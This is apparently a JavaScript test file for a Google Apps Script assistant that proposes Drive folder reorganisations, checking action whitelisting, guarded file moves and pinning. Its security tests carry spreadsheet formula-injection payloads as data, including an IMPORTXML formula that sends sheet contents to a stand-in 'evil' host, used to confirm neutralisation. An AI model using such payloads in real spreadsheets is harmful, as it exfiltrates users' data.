'use strict';
/**
 * ASSISTANT CHAT — OPÉRATIONS DE DOSSIERS (C28-30 PR2, ADR-0026). Vérifie : la whiteliste des actions
 * proposées par le modèle (donnée non fiable), la construction des lignes de l'onglet `Réorg`, le
 * déplacement de FICHIER gardé (`appliquerDeplacerFichier_` : §1 source ET cible, moveTo seul,
 * épinglage), et la CONVERGENCE (un fichier épinglé est immunisé des campagnes de re-rangement).
 */
const { test } = require('node:test');
const assert = require('node:assert');
const { load } = require('./harness');
const plat = (o) => JSON.parse(JSON.stringify(o));

/* ------------------------------- whiteliste (PURE) ------------------------------- */

test('parserActionsChat_ : whiteliste par action (types, id requis, nom sans « / », plafond)', () => {
  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
  const r = c.parserActionsChat_([
    { type: 'deplacer-fichier', source: 'F1', cible: 'D1', source_nom: 'nas.txt', cible_nom: 'Réseau', raison: 'x' },
    { type: 'creer', cible: 'P1', nom: 'Garage', cible_nom: 'Véhicule' },
    { type: 'renommer', source: 'D2', nom: 'Impôts' },
    { type: 'deplacer', source: 'D3', cible: 'D4' },
    { type: 'fusionner', source: 'D5', cible: 'D6' },
    { type: 'creer', cible: 'P2' },                 // nom manquant → ignoré
    { type: 'deplacer-fichier', source: 'F9' },      // cible manquante → ignoré
    { type: 'renommer', nom: 'X' },                  // source manquante → ignoré
    { type: 'supprimer', source: 'D7' },             // type inconnu → ignoré
    { type: 'creer', cible: 'P3', nom: 'a/b' },       // « / » interdit → ignoré
  ]);
  assert.strictEqual(r.actions.length, 5, 'seules les 5 bien formées passent');
  assert.strictEqual(r.ignorees, 5);
  assert.deepStrictEqual(plat(r.actions).map((a) => a.type),
    ['deplacer-fichier', 'creer', 'renommer', 'deplacer', 'fusionner']);
  assert.strictEqual(c.parserActionsChat_([]), null);
  assert.strictEqual(c.parserActionsChat_('x'), null);
  assert.strictEqual(c.parserActionsChat_([{ type: 'creer' }]), null); // aucune valide → null
});

test('parserActionsChat_ : plafond CONFIG.REORG_ACTIONS_MAX (borne l\'écriture), reste compté ignoré', () => {
  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
  const max = c.CONFIG.REORG_ACTIONS_MAX;
  const brut = Array.from({ length: max + 3 }, (_, i) => ({ type: 'renommer', source: 'D' + i, nom: 'n' + i }));
  const r = c.parserActionsChat_(brut);
  assert.strictEqual(r.actions.length, max);
  assert.strictEqual(r.ignorees, 3);
});

test('neutraliserFormule_ : une cellule ne commence JAMAIS par un caractère de formule (revue sécurité F1)', () => {
  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
  // Une valeur qui débute par =/+/-/@/tab/CR est une FORMULE recalculée CÔTÉ SERVEUR par Google —
  // `=IMPORTXML(...&JOIN(",",Index!A2:A500)...)` exfiltrerait les métadonnées de la Sheet. On préfixe.
  for (const dangereux of ['=1+1', '=IMPORTXML("http://evil/?x="&JOIN(",",Index!A:A),"//a")', '+A1', '-2', '@x', '\t=x', '\r=y']) {
    assert.strictEqual(c.neutraliserFormule_(dangereux)[0], "'", 'neutralisé : ' + JSON.stringify(dangereux));
  }
  // Une valeur BÉNIGNE (id Drive, texte normal) est INTACTE — jamais de faux positif.
  for (const benin of ['1zFTPL9iADzjJ83F4keX2z', 'Facture Hydro 2025', '', 'a=b (pas en tête)']) {
    assert.strictEqual(c.neutraliserFormule_(benin), benin, 'intact : ' + JSON.stringify(benin));
  }
});

test('parserActionsChat_ : l\'injection de formule est neutralisée sur TOUS les champs de cellule (F1)', () => {
  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
  const r = c.parserActionsChat_([{
    type: 'deplacer-fichier', source: '=cmd()', cible: '@x',
    source_nom: '=leak(Index!A:A)', cible_nom: '+evil', raison: '=IMPORTXML("http://evil")',
  }]);
  assert.strictEqual(r.actions.length, 1);
  const a = plat(r.actions)[0];
  for (const champ of ['source', 'cible', 'sourceNom', 'cibleNom', 'raison']) {
    assert.strictEqual(a[champ][0], "'", champ + ' neutralisé (jamais une formule recalculée par Google)');
  }
  // Un id Drive légitime traverse INTACT (l'application le résout ; un préfixe casserait le move).
  const legit = plat(c.parserActionsChat_([{ type: 'renommer', source: '1zFTPL9iADzjJ83', nom: 'Impôts' }]).actions)[0];
  assert.strictEqual(legit.source, '1zFTPL9iADzjJ83');
  assert.strictEqual(legit.nom, 'Impôts');
});

test('parserActionsChat_ : source/cible sont bornés à 80 caractères (id Drive — au-delà = injection, F1)', () => {
  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
  const r = c.parserActionsChat_([{ type: 'deplacer', source: 'x'.repeat(500), cible: 'y'.repeat(500) }]);
  assert.strictEqual(r.actions[0].source.length, 80);
  assert.strictEqual(r.actions[0].cible.length, 80);
});

test('champsActionChat_ : champs requis par type ; null pour un type inconnu', () => {
  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
  assert.deepStrictEqual(plat(c.champsActionChat_('deplacer-fichier')), { src: true, cib: true, nom: false });
  assert.deepStrictEqual(plat(c.champsActionChat_('creer')), { src: false, cib: true, nom: true });
  assert.deepStrictEqual(plat(c.champsActionChat_('renommer')), { src: true, cib: false, nom: true });
  assert.strictEqual(c.champsActionChat_('supprimer'), null);
});

test('ligneActionChat_ : ligne 8 colonnes, ID « source→cible » selon le type', () => {
  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
  const ts = '2026-07-24T00:00:00.000Z';
  assert.deepStrictEqual(
    plat(c.ligneActionChat_('t', 1, { type: 'deplacer-fichier', source: 'F1', cible: 'D1', sourceNom: 'nas.txt', cibleNom: 'Réseau', nom: '', raison: 'r' }, ts)),
    ['t|1', 'deplacer-fichier', 'F1→D1', 'nas.txt', 'Réseau', 'proposé', 'r', ts]);
  assert.deepStrictEqual(
    plat(c.ligneActionChat_('t', 2, { type: 'creer', source: '', cible: 'P1', cibleNom: 'Véhicule', nom: 'Garage', sourceNom: '', raison: '' }, ts)),
    ['t|2', 'creer', '→P1', '', 'Véhicule/Garage', 'proposé', '', ts]);
  assert.deepStrictEqual(
    plat(c.ligneActionChat_('t', 3, { type: 'renommer', source: 'D2', cible: '', nom: 'Impôts', sourceNom: 'impots', cibleNom: '', raison: '' }, ts)),
    ['t|3', 'renommer', 'D2', 'impots', 'Impôts', 'proposé', '', ts]);
});

test('proposer_reorg : routé, écrit des lignes `proposé` dans Réorg, ne mute rien', () => {
  const c = load(['Config.gs', 'Cout.gs', 'Llm.gs', 'WebApp.gs']);
  const rows = [];
  c.feuille_ = () => ({ appendRow: (r) => rows.push(r) });
  const sortie = c.executerOutilChatAssistant_('proposer_reorg', {
    actions: [{ type: 'deplacer-fichier', source: 'F1', cible: 'D1', source_nom: 'nas.txt', cible_nom: 'Réseau' }],
    synthese: 'range le NAS',
  });
  assert.strictEqual(rows.length, 1);
  assert.strictEqual(rows[0][1], 'deplacer-fichier');
  assert.strictEqual(rows[0][2], 'F1→D1');
  assert.strictEqual(rows[0][5], 'proposé'); // statut : jamais appliqué ici
  assert.ok(/valider/i.test(sortie), sortie); // le modèle est instruit de prévenir Marc
  assert.ok(/inconnu/i.test(c.executerOutilChatAssistant_('supprime', {}))); // outil inconnu : sûr
});

/* --------------------- déplacement de FICHIER gardé (Reorg.gs) --------------------- */

function chargerReorg() {
  const c = load(['Config.gs', 'Reorg.gs']);
  // Dépendances inter-modules (Maintenance/Journal non chargés) : contrôlées par test.
  c.aParentProtege_ = (f) => f && f.__protege === true;          // source en zone protégée ?
  c.chaineMonteVersProtege_ = (d) => d && d.__protege === true;  // cible en zone protégée ?
  c._epingles = {};
  c.indexContient_ = (cle) => c._epingles[cle] === true;
  c._ajouts = [];
  c.indexAjouter_ = (cle, r) => { c._epingles[cle] = true; c._ajouts.push([cle, r.statut]); };
  return c;
}

test('appliquerDeplacerFichier_ : succès → moveTo(cible) + épinglage `epingle|<id>`', () => {
  const c = chargerReorg();
  let deplaceVers = null;
  const fichier = { getName: () => 'nas.txt', getMimeType: () => 'text/plain', moveTo: (d) => { deplaceVers = d; } };
  const cible = { getName: () => 'Réseau', getId: () => 'D1' };
  c.DriveApp = { getFileById: () => fichier, getFolderById: () => cible };
  const r = c.appliquerDeplacerFichier_({ source: 'F1', cible: 'D1' }, {});
  assert.strictEqual(r.statut, 'appliqué');
  assert.strictEqual(deplaceVers, cible, 'moveTo appelé vers la cible');
  assert.deepStrictEqual(plat(c._ajouts), [['epingle|F1', 'épinglé']]);
});

test('appliquerDeplacerFichier_ : SOURCE qui est un DOSSIER → refusé (structure), aucun move', () => {
  const c = chargerReorg();
  let bouge = false;
  // getFileById accepte un ID de dossier → on doit refuser par le MIME (jamais reloger une racine).
  const dossierEnSource = { getName: () => '04 · Immigration', getMimeType: () => 'application/vnd.google-apps.folder', moveTo: () => { bouge = true; } };
  c.DriveApp = { getFileById: () => dossierEnSource, getFolderById: () => ({ getName: () => 'x', getId: () => 'D1' }) };
  const r = c.appliquerDeplacerFichier_({ source: 'DOMROOT', cible: 'D1' }, {});
  assert.ok(/structure/.test(r.statut), r.statut);
  assert.strictEqual(bouge, false);
  assert.strictEqual(c._ajouts.length, 0);
});

test('appliquerDeplacerFichier_ : SOURCE en zone protégée → refusé, aucun move', () => {
  const c = chargerReorg();
  let bouge = false;
  const fichier = { getName: () => 'passeport.pdf', getMimeType: () => 'application/pdf', __protege: true, moveTo: () => { bouge = true; } };
  c.DriveApp = { getFileById: () => fichier, getFolderById: () => ({ getName: () => 'x', getId: () => 'D1' }) };
  const r = c.appliquerDeplacerFichier_({ source: 'F1', cible: 'D1' }, {});
  assert.ok(/zone protégée/.test(r.statut), r.statut);
  assert.strictEqual(bouge, false);
  assert.strictEqual(c._ajouts.length, 0);
});

test('appliquerDeplacerFichier_ : CIBLE protégée / système → refusé', () => {
  const c = chargerReorg();
  const fichier = { getName: () => 'x', getMimeType: () => 'application/pdf', moveTo: () => {} };
  // cible sous zone protégée
  c.DriveApp = { getFileById: () => fichier, getFolderById: () => ({ getName: () => 'Titres', getId: () => 'D9', __protege: true }) };
  assert.ok(/zone protégée|système/.test(c.appliquerDeplacerFichier_({ source: 'F1', cible: 'D9' }, {}).statut));
  // cible = file système « _… »
  c.DriveApp = { getFileById: () => fichier, getFolderById: () => ({ getName: () => '_Doublons', getId: () => 'D8' }) };
  assert.ok(/protégée|système/.test(c.appliquerDeplacerFichier_({ source: 'F1', cible: 'D8' }, {}).statut));
});

test('appliquerDeplacerFichier_ : fichier/cible introuvable → échec (jamais un plantage) ; idempotent', () => {
  const c = chargerReorg();
  c.DriveApp = { getFileById: () => { throw new Error('404'); }, getFolderById: () => ({ getName: () => 'x', getId: () => 'D1' }) };
  assert.strictEqual(c.appliquerDeplacerFichier_({ source: 'F1', cible: 'D1' }, {}).statut, 'échec');
  assert.strictEqual(c.appliquerDeplacerFichier_({ cible: 'D1' }, {}).statut, 'échec'); // source manquante

  // Idempotence : un rejeu (déjà épinglé) ne ré-écrit pas la clé, moveTo reste un no-op sûr.
  const c2 = chargerReorg();
  c2._epingles['epingle|F1'] = true;
  const fichier = { getName: () => 'x', getMimeType: () => 'application/pdf', moveTo: () => {} };
  c2.DriveApp = { getFileById: () => fichier, getFolderById: () => ({ getName: () => 'Réseau', getId: () => 'D1' }) };
  assert.strictEqual(c2.appliquerDeplacerFichier_({ source: 'F1', cible: 'D1' }, {}).statut, 'appliqué');
  assert.strictEqual(c2._ajouts.length, 0, 'épinglage non dupliqué');
});

test('creer : DANS un domaine/catégorie (intouchable) → AUTORISÉ ; refusé dans 04 et dans À trier', () => {
  const c = chargerReorg();
  let cree = null;
  const parent = { getName: () => 'Véhicule', getFoldersByName: () => ({ hasNext: () => false }), createFolder: (n) => { cree = n; } };
  c.DriveApp = { getFolderById: () => parent };
  // Catégorie intouchable comme parent : créer un ENFANT ne mute pas le parent → autorisé (demande Marc).
  const ok = c.appliquerUneAction_({ type: 'creer', cible: 'CAT1', cheminPropose: 'Véhicule/Garage' }, {}, { CAT1: true }, () => false);
  assert.strictEqual(ok.statut, 'appliqué');
  assert.strictEqual(cree, 'Garage');
  // Zone protégée (04) → refusé.
  assert.ok(/protégé|zone/.test(
    c.appliquerUneAction_({ type: 'creer', cible: 'IMM', cheminPropose: 'x/y' }, { IMM: true }, {}, () => false).statut));
  // À trier → refusé (le retrait d'`intouchables` ne doit PAS ré-ouvrir la création dans l'intake).
  assert.ok(/protégé|zone/.test(
    c.appliquerUneAction_({ type: 'creer', cible: c.CONFIG.DOSSIERS.A_TRIER, cheminPropose: 'x/y' }, {}, {}, () => false).statut));
});

test('actionsValidees_ : le type deplacer-fichier est reconnu (source→cible)', () => {
  const c = load(['Config.gs', 'Reorg.gs']);
  const lignes = [
    ['Clé', 'Type', 'ID', 'Chemin actuel', 'Chemin proposé', 'Statut', 'Détail', 'Horodaté'],
    ['chatreorg|1|1', 'deplacer-fichier', 'F1→D1', 'nas.txt', 'Réseau', 'validé', 'range', 't'],
  ];
  const v = c.actionsValidees_(lignes);
  assert.strictEqual(v.length, 1);
  assert.strictEqual(v[0].type, 'deplacer-fichier');
  assert.strictEqual(v[0].source, 'F1');
  assert.strictEqual(v[0].cible, 'D1');
});

/* --------------------------- convergence (épinglé immunise) --------------------------- */

test('convergence : un fichier épinglé est IGNORÉ par migration / réanalyse / grand rangement', () => {
  const epingle = (cle) => cle === 'epingle|PINNED';

  const m = load(['Config.gs', 'Migration.gs']);
  m.indexContient_ = epingle;
  const pin = { getId: () => 'PINNED', getMimeType: () => 'application/pdf', getName: () => 'Inconnu doc' };
  const libre = { getId: () => 'X', getMimeType: () => 'application/pdf', getName: () => 'Inconnu doc' };
  assert.strictEqual(m.estAMigrer_(pin, 't'), false, 'épinglé → jamais migré');
  assert.strictEqual(m.estAMigrer_(libre, 't'), true, 'non épinglé « Inconnu » → migrable (pas de faux skip)');
  assert.strictEqual(m.estAReanalyser_(pin, 't'), false, 'épinglé → jamais réanalysé');
  assert.strictEqual(m.estAReanalyser_(libre, 't'), true);

  const mn = load(['Config.gs', 'Maintenance.gs']);
  mn.indexContient_ = epingle;
  assert.strictEqual(mn.estAReclasserLeger_({ getName: () => 'vrac', getId: () => 'PINNED', getMimeType: () => 'application/pdf' }), false);
  assert.strictEqual(mn.estAReclasserLeger_({ getName: () => 'vrac', getId: () => 'X', getMimeType: () => 'application/pdf' }), true);
});

test('convergence : collecterConsolidation_ saute les fichiers épinglés', () => {
  const c = load(['Config.gs', 'Consolidation.gs']);
  c.indexContient_ = (cle) => cle === 'epingle|PINNED'; // ni conso| ni autre épingle
  const f = (id) => ({ getId: () => id });
  const dossier = { getFiles: () => iterLocal([f('PINNED'), f('LIBRE')]), getFolders: () => iterLocal([]) };
  const items = [];
  c.collecterConsolidation_(dossier, '02', items, 100, () => false, 'tag', { complet: true }, {});
  assert.deepStrictEqual(items.map((i) => i.id), ['LIBRE'], 'PINNED exclu, LIBRE collecté');
});

function iterLocal(arr) { let i = 0; return { hasNext: () => i < arr.length, next: () => arr[i++] }; }
